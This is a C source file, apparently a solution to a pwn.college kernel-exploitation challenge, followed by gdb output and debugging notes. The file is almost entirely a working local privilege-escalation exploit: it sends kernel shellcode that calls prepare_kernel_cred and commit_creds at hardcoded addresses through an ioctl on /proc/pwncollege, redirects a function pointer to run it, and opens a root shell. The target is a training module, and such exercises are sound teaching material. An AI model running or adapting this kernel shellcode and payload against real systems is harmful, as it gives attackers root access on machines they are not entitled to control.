#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// Shellcode to escalate privileges
unsigned char shellcode[] = {
    // mov rdi, 0
    0x48, 0x31, 0xff,
    // call prepare_kernel_cred 0xffffffff810881d0
    0x48, 0xb8, 0xd0, 0x81, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xd0,
    // mov rdi, rax
    0x48, 0x89, 0xc7,
    // call commit_creds 0xffffffff81087e90
    0x48, 0xb8, 0x90, 0x7e, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xd0,
    // return
    0xc3
};

int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Allocate buffer large enough to hold everything
    char payload[0x1010] = {0};
    
    // Set size at offset 0 (8 bytes)
    *(uint64_t*)(payload + 0) = sizeof(shellcode);
    
    // Copy shellcode at offset 8
    memcpy(payload + 8, shellcode, sizeof(shellcode));
    
    // Set function pointer at offset 0x1008 (8 bytes)
    *(uint64_t*)(payload + 0x1008) = 0xffffc90000085000ULL;
    
    printf("Size: %lu\n", *(uint64_t*)(payload + 0));
    printf("Function pointer: 0x%lx\n", *(uint64_t*)(payload + 0x1008));
    printf("Triggering exploit...\n");
    
    ioctl(fd, 0x539, payload);
    
    close(fd);
    
    if (getuid() == 0) {
        printf("Root achieved!\n");
        system("/bin/sh");
    } else {
        printf("Exploit failed\n");
    }
    
    return 0;
}


/*
(gdb) finish
Run till exit from #0  _copy_from_user (to=0xffffc90000085000, from=0x7ffc5deaacd8, n=31) at ./arch/x86/include/asm/current.h:15
0xffffffffc0001121 in ?? ()
Value returned is $1 = 0
(gdb) x/50i 0xffffc90000085000
*/


// shellcode = (uchar *)__vmalloc(0x1000,0xcc0,(uint)___default_kernel_pte_mask & 0x163);
// shellcode, an address returned by vmalloc, is a kernel buffer

// _copy_from_user(shellcode,arg + 8);
// here arg + 8 is a userland buffer
// that's why I see `_copy_from_user (to=0xffffc90000085000, from=0x7ffc5deaacd8, n=31)`
// also we can't execute user code on kernel space

